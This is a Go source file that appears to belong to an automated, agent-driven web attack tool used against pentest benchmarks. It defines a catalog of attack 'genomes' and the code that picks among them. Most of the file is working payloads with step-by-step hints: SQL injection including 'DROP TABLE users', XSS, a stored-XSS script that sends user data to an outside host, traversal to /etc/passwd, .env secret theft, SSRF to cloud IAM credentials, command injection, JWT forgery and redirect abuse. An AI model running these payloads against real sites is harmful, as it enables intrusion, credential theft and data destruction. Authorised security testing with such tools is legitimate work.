// Package attacks holds the Go-side genome catalog and mutation helper data
// (seed genomes, technique lists, target-path lists). These are data tables,
// not literal ports of the legacy Python attack scripts.
package attacks

// Genome is the attack-vector descriptor handed to each attacker pod via
// the GENOME env var. Field names mirror data_contracts.genome_schema in
// PRD.json.
type Genome struct {
	Vector         string         `json:"vector"`
	Category       string         `json:"category"`
	Technique      string         `json:"technique"`
	TargetPath     string         `json:"target_path"`
	Params         map[string]any `json:"params"`
	Hint           string         `json:"hint"`
	ParentPodID    string         `json:"parent_pod_id,omitempty"`
	RequiresNimble bool           `json:"requires_nimble,omitempty"`
}

// SeedGenomes is the Generation-1 starter population of generic OWASP
// Top 10 attack vectors. Order is significant: when --population is less
// than the full list the control plane uses the first N entries
// deterministically, which keeps demo runs reproducible.
var SeedGenomes = []Genome{
	{
		// recon is intentionally FIRST so PickSeedGenomes always includes it
		// for small populations. It is the generic "learn the target" probe:
		// instead of guessing API paths, it fetches the site root + common
		// discovery files, parses links/forms/params, and reports the real
		// paths it found. Later generations mutate toward those discovered
		// paths (see mutate.go discoveredPaths handling), which is how the
		// swarm adapts to ANY site rather than a hardcoded route list.
		Vector: "recon_surface_map", Category: "recon", Technique: "crawl_light",
		TargetPath: "/",
		Params: map[string]any{
			"seeds":     []any{"/", "/robots.txt", "/sitemap.xml"},
			"max_pages": 8,
			"extract":   []any{"links", "forms", "query_params", "js_libraries"},
		},
		Hint:           "Map the attack surface: fetch root + robots/sitemap, follow same-origin links, and report discovered paths, forms, query params, and JS library versions. Render with nimble if the page is a JS shell.",
		RequiresNimble: true,
	},
	{
		Vector: "sqli_login", Category: "injection", Technique: "tautology",
		TargetPath: "/api/login",
		Params:     map[string]any{"username_payload": "' OR 1=1--", "password": "x"},
		Hint:       "Try auth bypass via SQL tautology in login form.",
	},
	{
		Vector: "sqli_search", Category: "injection", Technique: "union_select",
		TargetPath: "/api/search",
		Params:     map[string]any{"q_payload": "' UNION SELECT 1,2,3--"},
		Hint:       "Try UNION-based info leak via search parameter.",
	},
	{
		Vector: "xss_search_reflected", Category: "xss", Technique: "reflected",
		TargetPath: "/search",
		Params:     map[string]any{"q": "<script>alert(1)</script>"},
		Hint:       "Try reflected XSS via search query parameter.",
	},
	{
		Vector: "bola_user_by_id", Category: "access_control", Technique: "id_enumeration",
		TargetPath: "/api/users/1",
		Params:     map[string]any{},
		Hint:       "Try fetching user record by ID without auth.",
	},
	{
		Vector: "bola_resource_enum", Category: "access_control", Technique: "id_enumeration",
		TargetPath: "/api/orders/1",
		Params:     map[string]any{},
		Hint:       "Try enumerating resources by sequential ID.",
	},
	{
		Vector: "jwt_alg_none", Category: "auth", Technique: "jwt_swap",
		TargetPath: "/api/me",
		Params:     map[string]any{"forge_alg": "none"},
		Hint:       "Forge a JWT with alg=none claiming admin privileges.",
	},
	{
		Vector: "path_traversal", Category: "data_exposure", Technique: "dotdot",
		TargetPath: "/api/files",
		Params:     map[string]any{"file": "../../../etc/passwd"},
		Hint:       "Try directory traversal to read sensitive files.",
	},
	{
		Vector: "data_exposure_env", Category: "data_exposure", Technique: "direct_get",
		TargetPath: "/.env",
		Params:     map[string]any{},
		Hint:       "Direct fetch of .env file for leaked secrets.",
	},
	{
		Vector: "data_exposure_robots", Category: "data_exposure", Technique: "direct_get",
		TargetPath: "/robots.txt",
		Params:     map[string]any{},
		Hint:       "Read robots.txt for disallowed paths.",
	},
	{
		Vector: "admin_panel", Category: "access_control", Technique: "force_browse",
		TargetPath:     "/admin",
		Params:         map[string]any{},
		Hint:           "Try to reach admin panel directly.",
		RequiresNimble: true,
	},
	{
		Vector: "stored_xss_comment", Category: "xss", Technique: "stored",
		TargetPath: "/api/comments",
		Params: map[string]any{
			"comment_payload": "<script>fetch('/api/users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>",
		},
		Hint: "Try stored XSS in a user-submitted text field.",
	},
	{
		Vector: "mass_assign_role", Category: "auth", Technique: "param_pollution",
		TargetPath: "/api/register",
		Params: map[string]any{"body": map[string]any{
			"email": "z+<rand>@oz.dev", "password": "p", "role": "admin", "isAdmin": true,
		}},
		Hint: "Mass-assign role=admin or isAdmin=true during registration. After registering, CONFIRM the fields persisted: decode the returned JWT (if any) and check for role/isAdmin claims, or GET /api/profile with the token and verify the fields appear. If confirmed, try accessing an admin-only endpoint (e.g. /api/admin/flag) with the token.",
	},
	{
		Vector: "sqli_error_based", Category: "injection", Technique: "error_based",
		TargetPath: "/api/products",
		Params:     map[string]any{"q_payload": "' OR 1=1; DROP TABLE users--"},
		Hint:       "Try error-based SQL injection via search/filter parameter.",
	},
	{
		Vector: "captcha_bypass", Category: "validation", Technique: "skip_token",
		TargetPath: "/api/contact",
		Params:     map[string]any{"omit_captcha": true},
		Hint:       "Submit form without captcha token.",
	},
	{
		Vector: "hidden_routes", Category: "data_exposure", Technique: "force_browse",
		TargetPath:     "/api/debug",
		Params:         map[string]any{},
		Hint:           "Probe for hidden debug/admin routes.",
		RequiresNimble: true,
	},
	{
		// Generic reflected XSS that does NOT assume a specific path. The
		// agent should aim it at whatever search/query parameter recon found
		// (mutate.go varies the path toward discovered routes).
		Vector: "xss_reflected_generic", Category: "xss", Technique: "reflected",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"q":          "<svg onload=alert(1)>",
				"search":     "\"><script>alert(1)</script>",
				"searchTerm": "'\"><img src=x onerror=alert(1)>",
				"name":       "<script>alert(1)</script>",
			},
		},
		Hint: "Inject XSS payloads into common reflected query params; check whether the payload appears unescaped/executed in the response or rendered DOM.",
	},
	{
		Vector: "xxe_xml_endpoint", Category: "injection", Technique: "xxe",
		TargetPath: "/",
		Params: map[string]any{
			"content_type": "application/xml",
			"body":         "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><stockCheck><productId>&x;</productId></stockCheck>",
		},
		Hint:           "Find an endpoint that accepts XML (e.g. stock/price check) and test for XXE: define an external entity and see if its value is resolved/reflected in the response.",
		RequiresNimble: true,
	},
	{
		Vector: "ssti_template", Category: "injection", Technique: "template_injection",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"q":      "${{7*7}}",
				"name":   "{{7*7}}",
				"search": "{7*7}",
			},
		},
		Hint: "Inject template expressions into reflected params; if the response contains the EVALUATED result (e.g. 49) rather than the literal, server-side or client-side template injection is present.",
	},
	{
		Vector: "prototype_pollution", Category: "xss", Technique: "client_side_proto",
		TargetPath: "/",
		Params: map[string]any{
			"query": "__proto__[oz]=polluted&constructor[prototype][oz]=polluted",
		},
		Hint:           "Test client-side prototype pollution via URL params; render with nimble and check whether Object.prototype gains the injected property (look for gadget execution / reflected proto key).",
		RequiresNimble: true,
	},
	{
		Vector: "open_redirect", Category: "access_control", Technique: "redirect",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"url":      "https://evil.example.com",
				"redirect": "//evil.example.com",
				"next":     "https://evil.example.com",
				"returnTo": "/\\evil.example.com",
			},
		},
		Hint: "Test redirect/url/next/returnTo params for open redirection to an external origin (Location header or client-side navigation).",
	},
	{
		Vector: "crlf_header_injection", Category: "injection", Technique: "crlf",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"url":  "%0d%0aX-Injected:%20oz",
				"q":    "%0d%0aSet-Cookie:%20oz=1",
				"lang": "en%0d%0aX-Injected:%20oz",
			},
		},
		Hint: "Inject CRLF (%0d%0a) into params reflected into response headers; check for an injected response header (HTTP response splitting / header injection).",
	},
	{
		Vector: "vuln_js_dependency", Category: "data_exposure", Technique: "fingerprint_libs",
		TargetPath: "/",
		Params: map[string]any{
			"check": []any{"script_src_versions", "package_manifests", "source_comments"},
		},
		Hint:           "Fingerprint front-end JS libraries (script src filenames, version comments, /resources/js/*) and flag known-vulnerable versions (e.g. old AngularJS/jQuery/React-dev builds).",
		RequiresNimble: true,
	},
	{
		Vector: "base64_param_tamper", Category: "injection", Technique: "encoded_param",
		TargetPath: "/",
		Params: map[string]any{
			"note": "decode base64-looking query/cookie values, tamper the cleartext, re-encode, and test for injection/IDOR in the decoded field.",
		},
		Hint: "Find base64-encoded data in parameters or cookies, decode it, inject (SQLi/XSS/IDOR) into the cleartext, re-encode, and resend.",
	},

	// ---- Modern vuln classes mined from a broad pentest-benchmark corpus.
	// All payload shapes below are GENERIC and sanitized: they describe the
	// technique, not any specific target. The agent aims them at whatever
	// matching endpoint recon discovered.

	{
		Vector: "nosql_operator_injection", Category: "injection", Technique: "operator_injection",
		TargetPath: "/api/login",
		Params: map[string]any{
			"body":       map[string]any{"username": "admin", "password": map[string]any{"$ne": ""}},
			"query_form": "username[$ne]=&password[$ne]=",
		},
		Hint: "Inject MongoDB/ORM query operators ($ne/$gt/$where) into JSON or bracketed query params to bypass auth or dump records.",
	},
	{
		Vector: "graphql_introspection", Category: "data_exposure", Technique: "introspection",
		TargetPath: "/graphql",
		Params: map[string]any{
			"body": map[string]any{"query": "{__schema{types{name fields{name}}}}"},
		},
		Hint:           "POST an introspection query to /graphql; if __schema is returned, the schema (incl. hidden types/fields) is disclosed.",
		RequiresNimble: true,
	},
	{
		Vector: "graphql_authz_bypass", Category: "access_control", Technique: "nested_resolver",
		TargetPath: "/graphql",
		Params: map[string]any{
			"body": map[string]any{"query": "{posts{author{email role secretNote}}}"},
		},
		Hint: "Request sensitive fields through nested GraphQL resolvers or mutations that skip the top-level authorization check.",
	},
	{
		Vector: "jwt_alg_confusion", Category: "auth", Technique: "rs256_to_hs256",
		TargetPath: "/api/me",
		Params: map[string]any{
			"fetch_key_from": []any{"/.well-known/jwks.json", "/.well-known/public-key.pem"},
			"forge":          map[string]any{"alg": "HS256", "claims": map[string]any{"role": "admin"}},
			"note":           "sign HS256 using the RSA public key bytes as the HMAC secret",
		},
		Hint: "If the server exposes its RSA public key and accepts HS256, forge a token signed HS256 with the public key as the HMAC secret (algorithm confusion).",
	},
	{
		Vector: "ssrf_url_param", Category: "ssrf", Technique: "url_fetch",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"url":      "http://169.254.169.254/latest/meta-data/",
				"target":   "http://127.0.0.1:80/",
				"redirect": "file:///etc/passwd",
			},
			"internal_targets_to_try": []any{
				// Once the fetcher works, the flag is almost never at the
				// generic metadata/localhost targets — it is on an INTERNAL
				// SERVICE the public app talks to. Enumerate sibling service
				// hostnames + admin/secret paths. These names are the common
				// conventions across the benchmark corpus, not one target.
				"http://internal-api/admin/flag", "http://internal/admin/flag",
				"http://backend/admin/flag", "http://api-internal/flag",
				"http://localhost/admin/flag", "http://127.0.0.1/flag",
				"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			},
		},
		Hint:           "Find a server-side fetcher (preview/proxy/import/pdf) and point it at internal-only content. FIRST confirm it fetches (e.g. http://example.com works), THEN PIVOT to read the secret: aim it at INTERNAL SERVICE hostnames the app depends on (internal-api, internal, backend, api-internal — try the service names recon found) on admin/flag-style paths, plus localhost and cloud metadata. The flag is usually on an internal service's /admin/flag or /flag, NOT on the public app. Read FLAG{...} out of the proxied response body.",
		RequiresNimble: true,
	},
	{
		Vector: "sqli_blind_time", Category: "injection", Technique: "time_based",
		TargetPath: "/api/search",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"q":        "x' OR SLEEP(5)-- -",
				"id":       "1 AND SLEEP(5)",
				"category": "1' AND (SELECT SLEEP(5))-- -",
			},
			"baseline_compare": true,
		},
		Hint: "Test blind/time-based SQLi: inject a conditional SLEEP() and confirm the response is delayed (~5s) versus a sub-second baseline.",
	},
	{
		Vector: "command_injection", Category: "injection", Technique: "shell_metachar",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"host": "127.0.0.1; id",
				"ip":   "127.0.0.1 | id",
				"cmd":  "$(id)",
			},
		},
		Hint: "Inject shell metacharacters (;, |, $(), backticks) into host/ping/diagnostic params; confirm command output (e.g. uid=...gid=...) in the response.",
	},
	{
		Vector: "deserialization_probe", Category: "deserialization", Technique: "object_injection",
		TargetPath: "/",
		Params: map[string]any{
			"note": "look for base64/serialized blobs in cookies/body (pickle, PHP O:, Java rO0); test whether crafted serialized objects trigger magic-method side effects or OOB callbacks.",
		},
		Hint:           "Identify serialized data (session cookie, message body) and test for unsafe deserialization via a benign gadget that produces an observable side effect / OOB callback.",
		RequiresNimble: true,
	},
	{
		Vector: "idor_uuid_enum", Category: "access_control", Technique: "object_enumeration",
		TargetPath: "/api/orders/1",
		Params: map[string]any{
			"enumerate":         []any{1, 2, 3, 100},
			"check_other_owner": true,
			"note":              "also read sequential IDs leaked via debug/error headers when the public ID is a UUID",
		},
		Hint: "Enumerate object IDs (sequential or leaked-from-headers) and check whether you can read records owned by other users without authorization.",
	},
	{
		Vector: "oauth_redirect_bypass", Category: "access_control", Technique: "redirect_validation",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"redirect_uri": "https://trusted.example.com.evil.example.com/steal",
				"return_to":    "https://trusted.example.com@evil.example.com",
				"next":         "//evil.example.com",
			},
		},
		Hint: "Bypass weak redirect_uri/return_to validation (startsWith/substring) with lookalike host, @-trick, or scheme-relative URL; confirm redirect to an external origin.",
	},
	{
		Vector: "race_condition_toctou", Category: "business_logic", Technique: "parallel_requests",
		TargetPath: "/",
		Params: map[string]any{
			"concurrency": 20,
			"note":        "fire many identical requests in parallel inside the check-then-act window (transfer/purchase/redeem)",
		},
		Hint: "Test TOCTOU race conditions: send many concurrent identical state-changing requests and check for over-spend / oversold / negative balance.",
	},
	{
		Vector: "path_traversal_encoded", Category: "data_exposure", Technique: "encoding_bypass",
		TargetPath: "/",
		Params: map[string]any{
			"param_payloads": map[string]any{
				"file": "....//....//....//etc/passwd",
				"path": "%252e%252e%252fetc%252fpasswd",
				"name": "..%2f..%2f..%2fetc%2fpasswd",
			},
		},
		Hint: "Defeat naive ../ filters on file params using nested (....//) or double-encoded (%252e) traversal; confirm contents of a file outside the web root.",
	},
	{
		Vector: "cors_origin_reflection", Category: "misconfig", Technique: "origin_reflection",
		TargetPath: "/",
		Params: map[string]any{
			"send_header": map[string]any{"Origin": "https://attacker.example.com"},
			"check":       []any{"Access-Control-Allow-Origin echoes Origin", "Access-Control-Allow-Credentials: true"},
		},
		Hint: "Send an arbitrary Origin header; if ACAO reflects it while ACAC is true, cross-origin credentialed reads are possible.",
	},
	{
		Vector: "type_juggling_auth", Category: "auth", Technique: "loose_comparison",
		TargetPath: "/api/login",
		Params: map[string]any{
			"body":  map[string]any{"username": "admin", "password": true},
			"magic": []any{"QNKCDZO", "240610708"},
		},
		Hint: "Test loose-comparison (PHP ==) auth bypass: send a boolean password or a magic 0e-prefixed hash string and check for auth success.",
	},
	{
		Vector: "request_smuggling", Category: "protocol", Technique: "cl_te_desync",
		TargetPath: "/",
		Params: map[string]any{
			"note": "send a request with both Content-Length and Transfer-Encoding: chunked; smuggle a second request to a restricted path through a front proxy.",
		},
		Hint:           "Test HTTP request smuggling (CL.TE): conflicting Content-Length / Transfer-Encoding headers to desync proxy and backend and reach a restricted path.",
		RequiresNimble: false,
	},
}

// PickSeedGenomes returns n seed genomes chosen for CATEGORY DIVERSITY rather
// than raw list order. The recon genome (if present) is always first, then the
// mass-assignment genome (if present) is second, then the remaining slots are
// filled by round-robin across categories: one genome from each distinct
// category in turn, cycling until n are picked. This guarantees that even a
// small population spans many vulnerability classes instead of only the first
// few list entries — important because the catalog has grown well past a
// typical population size, and otherwise whole classes (SSRF, GraphQL, NoSQL,
// ...) would never be seeded at the default population.
//
// Selection is deterministic (stable category order = first-seen order in
// SeedGenomes, stable genome order within a category), so demo runs remain
// reproducible. If n exceeds the catalog size the round-robin wraps and
// repeats genomes, matching the old wrap-around behaviour.
func PickSeedGenomes(n int) []Genome {
	if n <= 0 {
		return nil
	}
	if len(SeedGenomes) == 0 {
		return nil
	}

	// Group genome indices by category, preserving first-seen order both for
	// the category sequence and within each category.
	categoryOrder := make([]string, 0)
	byCategory := make(map[string][]int)
	for i, g := range SeedGenomes {
		if _, ok := byCategory[g.Category]; !ok {
			categoryOrder = append(categoryOrder, g.Category)
		}
		byCategory[g.Category] = append(byCategory[g.Category], i)
	}

	out := make([]Genome, 0, n)
	cursor := make(map[string]int)

	// Priority seeds: recon always leads, then mass-assignment (common and
	// high-value per APEX-019). Mark their first genomes as already consumed
	// so the round-robin below doesn't place them twice.
	if idxs, ok := byCategory["recon"]; ok && len(idxs) > 0 {
		out = append(out, SeedGenomes[idxs[0]])
		cursor["recon"] = 1
	}
	if idxs, ok := byCategory["auth"]; ok && len(idxs) > 0 {
		// Find mass_assign_role specifically if it exists
		for _, idx := range idxs {
			if SeedGenomes[idx].Vector == "mass_assign_role" {
				out = append(out, SeedGenomes[idx])
				cursor["auth"] = idx + 1 // mark as consumed
				break
			}
		}
	}

	// First, distribute unique genomes round-robin across categories: one
	// fresh genome per category per pass, until every genome has been used
	// once or n is reached. This maximises class diversity before any repeats.
	for len(out) < n {
		progressed := false
		for _, cat := range categoryOrder {
			if len(out) >= n {
				break
			}
			idxs := byCategory[cat]
			if cursor[cat] >= len(idxs) {
				continue // category exhausted (no fresh genome this pass)
			}
			out = append(out, SeedGenomes[idxs[cursor[cat]]])
			cursor[cat]++
			progressed = true
		}
		if !progressed {
			break // every genome used once; fall through to wrap-around
		}
	}

	// If n still exceeds the unique catalog, wrap by repeating the diverse
	// sequence we just built (preserves old "wrap modulo" behaviour for huge n).
	if len(out) < n && len(out) > 0 {
		base := append([]Genome(nil), out...)
		for i := 0; len(out) < n; i++ {
			out = append(out, base[i%len(base)])
		}
	}
	return out
}

// PickSeedGenomesEnsuringNimble is the Nimble-aware variant. It first picks
// n deterministic seeds, then guarantees that at least one of them has
// RequiresNimble=true so the verification step ("at least one pod per
// generation invokes nimble_fetch when enabled") is honoured for small
// populations. If n=0 returns nil; if no requires-nimble seed exists in
// the catalog it falls back to PickSeedGenomes silently.
func PickSeedGenomesEnsuringNimble(n int) []Genome {
	picked := PickSeedGenomes(n)
	if len(picked) == 0 {
		return picked
	}
	for _, g := range picked {
		if g.RequiresNimble {
			return picked
		}
	}
	var nimbleSeed *Genome
	for i := range SeedGenomes {
		if SeedGenomes[i].RequiresNimble {
			nimbleSeed = &SeedGenomes[i]
			break
		}
	}
	if nimbleSeed == nil {
		return picked
	}
	picked[len(picked)-1] = *nimbleSeed
	return picked
}
